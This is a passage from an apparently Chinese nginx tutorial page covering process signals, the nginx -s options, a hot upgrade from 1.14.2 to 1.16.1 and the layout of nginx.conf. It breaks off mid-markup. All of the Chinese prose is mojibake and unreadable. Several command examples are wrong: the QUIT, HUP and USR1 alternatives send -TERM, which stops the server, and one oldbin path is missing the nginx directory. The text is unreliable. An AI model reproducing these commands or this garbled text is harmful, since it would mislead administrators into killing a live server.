nginx</code>ï¼›</p><p>æ–¹å¼äºŒï¼šåœ¨è®²è§£nginxçš„<code>./configure</code>çš„é…ç½®å‚æ•°çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªå‚æ•°æ˜¯<code>--pid-path=PATH</code>é»˜è®¤æ˜¯<code>/usr/local/nginx/logs/nginx.pid</code>,æ‰€ä»¥å¯ä»¥é€šè¿‡æŸ¥çœ‹è¯¥æ–‡ä»¶æ¥è·å–nginxçš„masterè¿›ç¨‹ID.</p><p>ï¼ˆ2ï¼‰ä¿¡å·</p><table><thead><tr><th>ä¿¡å·</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>TERM/INT</td><td>ç«‹å³å…³é—­æ•´ä¸ªæœåŠ¡</td></tr><tr><td>QUIT</td><td>&quot;ä¼˜é›…&quot;åœ°å…³é—­æ•´ä¸ªæœåŠ¡</td></tr><tr><td>HUP</td><td>é‡è¯»é…ç½®æ–‡ä»¶å¹¶ä½¿ç”¨æœåŠ¡å¯¹æ–°é…ç½®é¡¹ç”Ÿæ•ˆ</td></tr><tr><td>USR1</td><td>é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œæ—¥å¿—åˆ‡å‰²</td></tr><tr><td>USR2</td><td>å¹³æ»‘å‡çº§åˆ°æœ€æ–°ç‰ˆçš„nginx</td></tr><tr><td>WINCH</td><td>æ‰€æœ‰å­è¿›ç¨‹ä¸åœ¨æ¥æ”¶å¤„ç†æ–°è¿æ¥ï¼Œç›¸å½“äºç»™workè¿›ç¨‹å‘é€QUITæŒ‡ä»¤</td></tr></tbody></table><p>è°ƒç”¨å‘½ä»¤ä¸º<code>kill -signal PID</code></p><p>signal:å³ä¸ºä¿¡å·ï¼›PIDå³ä¸ºè·å–åˆ°çš„masterçº¿ç¨‹ID</p><ol><li>å‘é€TERM/INTä¿¡å·ç»™masterè¿›ç¨‹ï¼Œä¼šå°†NginxæœåŠ¡ç«‹å³å…³é—­ã€‚</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">kill -TERM PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br>kill -<span class="hljs-keyword">INT</span> PID <span class="hljs-regexp">/ kill -INT `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="2"><li>å‘é€QUITä¿¡å·ç»™masterè¿›ç¨‹ï¼Œmasterè¿›ç¨‹ä¼šæ§åˆ¶æ‰€æœ‰çš„workè¿›ç¨‹ä¸å†æ¥æ”¶æ–°çš„è¯·æ±‚ï¼Œç­‰æ‰€æœ‰è¯·æ±‚å¤„ç†å®Œåï¼Œåœ¨æŠŠè¿›ç¨‹éƒ½å…³é—­æ‰ã€‚</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -QUIT PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="3"><li>å‘é€HUPä¿¡å·ç»™masterè¿›ç¨‹ï¼Œmasterè¿›ç¨‹ä¼šæŠŠæ§åˆ¶æ—§çš„workè¿›ç¨‹ä¸å†æ¥æ”¶æ–°çš„è¯·æ±‚ï¼Œç­‰å¤„ç†å®Œè¯·æ±‚åå°†æ—§çš„workè¿›ç¨‹å…³é—­æ‰ï¼Œç„¶åæ ¹æ®nginxçš„é…ç½®æ–‡ä»¶é‡æ–°å¯åŠ¨æ–°çš„workè¿›ç¨‹</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -HUP PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="4"><li>å‘é€USR1ä¿¡å·ç»™masterè¿›ç¨‹ï¼Œå‘Šè¯‰Nginxé‡æ–°å¼€å¯æ—¥å¿—æ–‡ä»¶</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -USR1 PID <span class="hljs-regexp">/ kill -TERM `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><ol start="5"><li>å‘é€USR2ä¿¡å·ç»™masterè¿›ç¨‹ï¼Œå‘Šè¯‰masterè¿›ç¨‹è¦å¹³æ»‘å‡çº§ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä¼šé‡æ–°å¼€å¯å¯¹åº”çš„masterè¿›ç¨‹å’Œworkè¿›ç¨‹ï¼Œæ•´ä¸ªç³»ç»Ÿä¸­å°†ä¼šæœ‰ä¸¤ä¸ªmasterè¿›ç¨‹ï¼Œå¹¶ä¸”æ–°çš„masterè¿›ç¨‹çš„PIDä¼šè¢«è®°å½•åœ¨<code>/usr/local/nginx/logs/nginx.pid</code>è€Œä¹‹å‰çš„æ—§çš„masterè¿›ç¨‹PIDä¼šè¢«è®°å½•åœ¨<code>/usr/local/nginx/logs/nginx.pid.oldbin</code>æ–‡ä»¶ä¸­ï¼Œæ¥ç€å†æ¬¡å‘é€QUITä¿¡å·ç»™æ—§çš„masterè¿›ç¨‹ï¼Œè®©å…¶å¤„ç†å®Œè¯·æ±‚åå†è¿›è¡Œå…³é—­</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -USR2 PID <span class="hljs-regexp">/ kill -USR2 `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -QUIT PID <span class="hljs-regexp">/ kill -QUIT `cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid.oldbin`<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586368250085.png" alt="1586368250085" /></p><ol start="6"><li>å‘é€WINCHä¿¡å·ç»™masterè¿›ç¨‹,è®©masterè¿›ç¨‹æ§åˆ¶ä¸è®©æ‰€æœ‰çš„workè¿›ç¨‹åœ¨æ¥æ”¶æ–°çš„è¯·æ±‚äº†ï¼Œè¯·æ±‚å¤„ç†å®Œåå…³é—­workè¿›ç¨‹ã€‚æ³¨æ„masterè¿›ç¨‹ä¸ä¼šè¢«å…³é—­æ‰</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -WINCH PID <span class="hljs-regexp">/kill -WINCH`cat /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/logs/</span>nginx.pid`<br></code></pre></td></tr></table></figure><h4 id="æ–¹å¼äºŒnginxçš„å‘½ä»¤è¡Œæ§åˆ¶"><a class="markdownIt-Anchor" href="#æ–¹å¼äºŒnginxçš„å‘½ä»¤è¡Œæ§åˆ¶"></a> æ–¹å¼äºŒ:Nginxçš„å‘½ä»¤è¡Œæ§åˆ¶</h4><p>æ­¤æ–¹å¼æ˜¯é€šè¿‡Nginxå®‰è£…ç›®å½•ä¸‹çš„sbinä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶nginxæ¥è¿›è¡ŒNginxçŠ¶æ€çš„æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>nginx -h</code>æ¥æŸ¥çœ‹éƒ½æœ‰å“ªäº›å‚æ•°å¯ä»¥ç”¨ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581486604517.png" alt="1581486604517" /></p><p>-?å’Œ-h:æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</p><p>-v:æ‰“å°ç‰ˆæœ¬å·ä¿¡æ¯å¹¶é€€å‡º</p><p>-V:æ‰“å°ç‰ˆæœ¬å·ä¿¡æ¯å’Œé…ç½®ä¿¡æ¯å¹¶é€€å‡º</p><p>-t:æµ‹è¯•nginxçš„é…ç½®æ–‡ä»¶è¯­æ³•æ˜¯å¦æ­£ç¡®å¹¶é€€å‡º</p><p>-T:æµ‹è¯•nginxçš„é…ç½®æ–‡ä»¶è¯­æ³•æ˜¯å¦æ­£ç¡®å¹¶åˆ—å‡ºç”¨åˆ°çš„é…ç½®æ–‡ä»¶ä¿¡æ¯ç„¶åé€€å‡º</p><p>-q:åœ¨é…ç½®æµ‹è¯•æœŸé—´ç¦æ­¢æ˜¾ç¤ºéé”™è¯¯æ¶ˆæ¯</p><p>-s:signalä¿¡å·ï¼Œåé¢å¯ä»¥è·Ÿ ï¼š</p><p>â€‹ stop[å¿«é€Ÿå…³é—­ï¼Œç±»ä¼¼äºTERM/INTä¿¡å·çš„ä½œç”¨]</p><p>â€‹quit[ä¼˜é›…çš„å…³é—­ï¼Œç±»ä¼¼äºQUITä¿¡å·çš„ä½œç”¨]</p><p>â€‹reopen[é‡æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶ç±»ä¼¼äºUSR1ä¿¡å·çš„ä½œç”¨]</p><p>â€‹reload[ç±»ä¼¼äºHUPä¿¡å·çš„ä½œç”¨]</p><p>-p:prefixï¼ŒæŒ‡å®šNginxçš„prefixè·¯å¾„ï¼Œ(é»˜è®¤ä¸º: /usr/local/nginx/)</p><p>-c:filename,æŒ‡å®šNginxçš„é…ç½®æ–‡ä»¶è·¯å¾„,(é»˜è®¤ä¸º: conf/nginx.conf)</p><p>-g:ç”¨æ¥è¡¥å……Nginxé…ç½®æ–‡ä»¶ï¼Œå‘NginxæœåŠ¡æŒ‡å®šå¯åŠ¨æ—¶åº”ç”¨å…¨å±€çš„é…ç½®</p><h3 id="nginxæœåŠ¡å™¨ç‰ˆæœ¬å‡çº§å’Œæ–°å¢æ¨¡å—"><a class="markdownIt-Anchor" href="#nginxæœåŠ¡å™¨ç‰ˆæœ¬å‡çº§å’Œæ–°å¢æ¨¡å—"></a> NginxæœåŠ¡å™¨ç‰ˆæœ¬å‡çº§å’Œæ–°å¢æ¨¡å—</h3><p>å¦‚æœæƒ³å¯¹Nginxçš„ç‰ˆæœ¬è¿›è¡Œæ›´æ–°ï¼Œæˆ–è€…è¦åº”ç”¨ä¸€äº›æ–°çš„æ¨¡å—ï¼Œæœ€ç®€å•çš„åšæ³•å°±æ˜¯åœæ­¢å½“å‰çš„NginxæœåŠ¡ï¼Œç„¶åå¼€å¯æ–°çš„NginxæœåŠ¡ã€‚ä½†æ˜¯è¿™æ ·ä¼šå¯¼è‡´åœ¨ä¸€æ®µæ—¶é—´å†…ï¼Œç”¨æˆ·æ˜¯æ— æ³•è®¿é—®æœåŠ¡å™¨ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°NginxæœåŠ¡å™¨æä¾›çš„å¹³æ»‘å‡çº§åŠŸèƒ½ã€‚è¿™ä¸ªä¹Ÿæ˜¯Nginxçš„ä¸€å¤§ç‰¹ç‚¹ï¼Œä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥ä½¿Nginxåœ¨7*24å°æ—¶ä¸é—´æ–­çš„æä¾›æœåŠ¡äº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æä¸‹éœ€æ±‚ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">éœ€æ±‚ï¼šNginxçš„ç‰ˆæœ¬æœ€å¼€å§‹ä½¿ç”¨çš„æ˜¯Nginx<span class="hljs-string">-1</span>.14.2,ç”±äºæœåŠ¡å‡çº§ï¼Œéœ€è¦å°†Nginxçš„ç‰ˆæœ¬å‡çº§åˆ°Nginx<span class="hljs-string">-1</span>.16.1,è¦æ±‚Nginxä¸èƒ½ä¸­æ–­æä¾›æœåŠ¡ã€‚<br></code></pre></td></tr></table></figure><p>ä¸ºäº†åº”å¯¹ä¸Šè¿°çš„éœ€æ±‚ï¼Œè¿™é‡Œæˆ‘ä»¬ç»™å¤§å®¶æä¾›ä¸¤ç§è§£å†³æ–¹æ¡ˆ:</p><p>æ–¹æ¡ˆä¸€:ä½¿ç”¨NginxæœåŠ¡ä¿¡å·å®ŒæˆNginxçš„å‡çº§</p><p>æ–¹æ¡ˆäºŒ:ä½¿ç”¨Nginxå®‰è£…ç›®å½•çš„makeå‘½ä»¤å®Œæˆå‡çº§</p><h4 id="ç¯å¢ƒå‡†å¤‡"><a class="markdownIt-Anchor" href="#ç¯å¢ƒå‡†å¤‡"></a> ç¯å¢ƒå‡†å¤‡</h4><p>ï¼ˆ1ï¼‰å…ˆå‡†å¤‡ä¸¤ä¸ªç‰ˆæœ¬çš„Nginxåˆ†åˆ«æ˜¯ 1.14.2å’Œ1.16.1</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨Nginxæºç å®‰è£…çš„æ–¹å¼å°†1.14.2ç‰ˆæœ¬å®‰è£…æˆåŠŸå¹¶æ­£ç¡®è®¿é—®</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">è¿›å…¥å®‰è£…ç›®å½•<br>./configure<br><span class="hljs-built_in">make</span> &amp;&amp; <span class="hljs-built_in">make</span> install<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å°†Nginx1.16.1è¿›è¡Œå‚æ•°é…ç½®å’Œç¼–è¯‘ï¼Œä¸éœ€è¦è¿›è¡Œå®‰è£…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">è¿›å…¥å®‰è£…ç›®å½•<br>./configure<br>make <br></code></pre></td></tr></table></figure><h4 id="æ–¹æ¡ˆä¸€ä½¿ç”¨nginxæœåŠ¡ä¿¡å·è¿›è¡Œå‡çº§"><a class="markdownIt-Anchor" href="#æ–¹æ¡ˆä¸€ä½¿ç”¨nginxæœåŠ¡ä¿¡å·è¿›è¡Œå‡çº§"></a> æ–¹æ¡ˆä¸€:ä½¿ç”¨NginxæœåŠ¡ä¿¡å·è¿›è¡Œå‡çº§</h4><p>ç¬¬ä¸€æ­¥:å°†1.14.2ç‰ˆæœ¬çš„sbinç›®å½•ä¸‹çš„nginxè¿›è¡Œå¤‡ä»½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br>mv nginx nginxold<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥:å°†Nginx1.16.1å®‰è£…ç›®å½•ç¼–è¯‘åçš„objsç›®å½•ä¸‹çš„nginxæ–‡ä»¶ï¼Œæ‹·è´åˆ°åŸæ¥<code>/usr/local/nginx/sbin</code>ç›®å½•ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd ~<span class="hljs-regexp">/nginx/</span>core<span class="hljs-regexp">/nginx-1.16.1/</span>objs<br>cp nginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥:å‘é€ä¿¡å·USR2ç»™Nginxçš„1.14.2ç‰ˆæœ¬å¯¹åº”çš„masterè¿›ç¨‹</p><p>ç¬¬å››æ­¥:å‘é€ä¿¡å·QUITç»™Nginxçš„1.14.2ç‰ˆæœ¬å¯¹åº”çš„masterè¿›ç¨‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">kill -QUIT `more <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/logs/</span>nginx.pid.oldbin`<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ¡ˆäºŒä½¿ç”¨nginxå®‰è£…ç›®å½•çš„makeå‘½ä»¤å®Œæˆå‡çº§"><a class="markdownIt-Anchor" href="#æ–¹æ¡ˆäºŒä½¿ç”¨nginxå®‰è£…ç›®å½•çš„makeå‘½ä»¤å®Œæˆå‡çº§"></a> æ–¹æ¡ˆäºŒ:ä½¿ç”¨Nginxå®‰è£…ç›®å½•çš„makeå‘½ä»¤å®Œæˆå‡çº§</h4><p>ç¬¬ä¸€æ­¥:å°†1.14.2ç‰ˆæœ¬çš„sbinç›®å½•ä¸‹çš„nginxè¿›è¡Œå¤‡ä»½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br>mv nginx nginxold<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥:å°†Nginx1.16.1å®‰è£…ç›®å½•ç¼–è¯‘åçš„objsç›®å½•ä¸‹çš„nginxæ–‡ä»¶ï¼Œæ‹·è´åˆ°åŸæ¥<code>/usr/local/nginx/sbin</code>ç›®å½•ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd ~<span class="hljs-regexp">/nginx/</span>core<span class="hljs-regexp">/nginx-1.16.1/</span>objs<br>cp nginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥:è¿›å…¥åˆ°å®‰è£…ç›®å½•ï¼Œæ‰§è¡Œ<code>make upgrade</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581494652284.png" alt="1581494652284" /></p><p>ç¬¬å››æ­¥:æŸ¥çœ‹æ˜¯å¦æ›´æ–°æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./nginx -v<br></code></pre></td></tr></table></figure><p>åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œå…¶å®Nginxæ˜¯ä¸€ç›´å¯¹å¤–æä¾›æœåŠ¡çš„ã€‚å¹¶ä¸”å½“Nginxçš„æœåŠ¡å™¨å¯åŠ¨æˆåŠŸåï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡æµè§ˆå™¨è¿›è¡Œç›´æ¥è®¿é—®çš„ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹htmlç›®å½•ä¸‹çš„é¡µé¢æ¥ä¿®æ”¹æˆ‘ä»¬åœ¨é¡µé¢ä¸Šæ‰€çœ‹åˆ°çš„å†…å®¹ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä¿®æ”¹htmlç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œèƒ½ä¸èƒ½å¤šæ·»åŠ ä¸€äº›é¡µé¢æ˜¯Nginxçš„åŠŸèƒ½æ›´åŠ ä¸°å¯Œï¼Œè¿˜æœ‰å‰é¢èŠåˆ°Nginxçš„å‰ç«¯åŠŸèƒ½åˆæ˜¯å¦‚ä½•æ¥å®ç°çš„ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬å¯¹Nginxçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶è¿›è¡Œä¸€ä¸ªè¯¦ç»†çš„å­¦ä¹ ã€‚</p><h2 id="nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶ç»“æ„"><a class="markdownIt-Anchor" href="#nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶ç»“æ„"></a> Nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶ç»“æ„</h2><p>ä»å‰é¢çš„å†…å®¹å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“Nginxçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶é»˜è®¤æ˜¯æ”¾åœ¨<code>/usr/local/nginx/conf/nginx.conf</code>ï¼Œè¿™ä¸€èŠ‚ï¼Œæˆ‘ä»¬å°±æ¥å­¦ä¹ ä¸‹nginx.confçš„å†…å®¹å’ŒåŸºæœ¬é…ç½®æ–¹æ³•ã€‚</p><p>è¯»å–Nginxè‡ªå¸¦çš„Nginxé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…¶ä¸­çš„æ³¨é‡Šéƒ¨åˆ†ã€å­¦ä¹ ä¸€ä¸ªæŠ€æœ¯ç‚¹å°±æ˜¯åœ¨Nginxçš„é…ç½®æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨<code>#</code>æ¥æ³¨é‡Šã€‘åˆ é™¤æ‰åï¼Œå°±å‰©ä¸‹ä¸‹é¢å†…å®¹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs conf">worker_processes  1;<br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br>http &#123;<br>    include       mime.types;<br>    default_type  application/octet-stream;<br>    sendfile        on;<br>    keepalive_timeout  65;<br><br>    server &#123;<br>        listen       80;<br>        server_name  localhost;<br>        location / &#123;<br>            root   html;<br>            index  index.html index.htm;<br>        &#125;<br>        error_page   500 502 503 504  /50x.html;<br>        location = /50x.html &#123;<br>            root   html;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">æŒ‡ä»¤åæŒ‡ä»¤å€¼;  <span class="hljs-comment">#å…¨å±€å—ï¼Œä¸»è¦è®¾ç½®NginxæœåŠ¡å™¨æ•´ä½“è¿è¡Œçš„é…ç½®æŒ‡ä»¤</span><br><br> <span class="hljs-comment">#eventså—,ä¸»è¦è®¾ç½®,NginxæœåŠ¡å™¨ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥,è¿™ä¸€éƒ¨åˆ†å¯¹NginxæœåŠ¡å™¨çš„æ€§èƒ½å½±å“è¾ƒå¤§</span><br>events &#123; <br>    æŒ‡ä»¤åæŒ‡ä»¤å€¼;<br>&#125;<br><span class="hljs-comment">#httpå—ï¼Œæ˜¯NginxæœåŠ¡å™¨é…ç½®ä¸­çš„é‡è¦éƒ¨åˆ†ï¼Œä»£ç†ã€ç¼“å­˜ã€æ—¥å¿—è®°å½•ã€ç¬¬ä¸‰æ–¹æ¨¡å—é…ç½®...             </span><br>http &#123;<br>    æŒ‡ä»¤åæŒ‡ä»¤å€¼;<br>    server &#123; <span class="hljs-comment">#serverå—ï¼Œæ˜¯Nginxé…ç½®å’Œè™šæ‹Ÿä¸»æœºç›¸å…³çš„å†…å®¹</span><br>        æŒ‡ä»¤åæŒ‡ä»¤å€¼;<br>        <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; </span><br><span class="hljs-title">        #location</span>å—ï¼ŒåŸºäºNginxæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å­—ç¬¦ä¸²ä¸locationåé¢çš„å€¼è¿›è¡ŒåŒ¹é…ï¼Œå¯¹ç‰¹å®šè¯·æ±‚è¿›è¡Œå¤„ç†<br>            æŒ‡ä»¤åæŒ‡ä»¤å€¼;<br>        &#125;<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•å°ç»“ä¸‹:</p><p>nginx.confé…ç½®æ–‡ä»¶ä¸­é»˜è®¤æœ‰ä¸‰å¤§å—ï¼šå…¨å±€å—ã€eventså—ã€httpå—</p><p>httpå—ä¸­å¯ä»¥é…ç½®å¤šä¸ªserverå—ï¼Œæ¯ä¸ªserverå—åˆå¯ä»¥é…ç½®å¤šä¸ªlocationå—ã€‚</p><h3 id="å…¨å±€å—"><a class="markdownIt-Anchor" href="#å…¨å±€å—"></a> å…¨å±€å—</h3><h4 id="useræŒ‡ä»¤"><a class="markdownIt-Anchor" href="#useræŒ‡ä»¤"></a> useræŒ‡ä»¤</h4><p>ï¼ˆ1ï¼‰user:ç”¨äºé…ç½®è¿è¡ŒNginxæœåŠ¡å™¨çš„workerè¿›ç¨‹çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>user user [group]</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>nobody</td></tr><tr><td>ä½ç½®</td><td>å…¨å±€å—</td></tr></tbody></table><p>è¯¥å±æ€§ä¹Ÿå¯ä»¥åœ¨ç¼–è¯‘çš„æ—¶å€™æŒ‡å®šï¼Œè¯­æ³•å¦‚ä¸‹<code>./configure --user=user --group=group</code>,å¦‚æœä¸¤ä¸ªåœ°æ–¹éƒ½è¿›è¡Œäº†è®¾ç½®ï¼Œæœ€ç»ˆç”Ÿæ•ˆçš„æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„é…ç½®ã€‚</p><p>è¯¥æŒ‡ä»¤çš„ä½¿ç”¨æ­¥éª¤:</p><p>(1)è®¾ç½®ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯&quot;www&quot;</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">www</span>;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1586597350943.png" alt="1586597350943" /></p><p>(2) åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">useradd www</span><br></code></pre></td></tr></table></figure><p>(3)ä¿®æ”¹userå±æ€§</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">www</span><br></code></pre></td></tr></table></figure><p>(4)åˆ›å»º<code>/root/html/index.html</code>é¡µé¢ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to nginx!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">35em</span>;</span><br><span class="language-css">        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">        <span class="hljs-attribute">font-family</span>: Tahoma, Verdana, Arial, sans-serif;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span 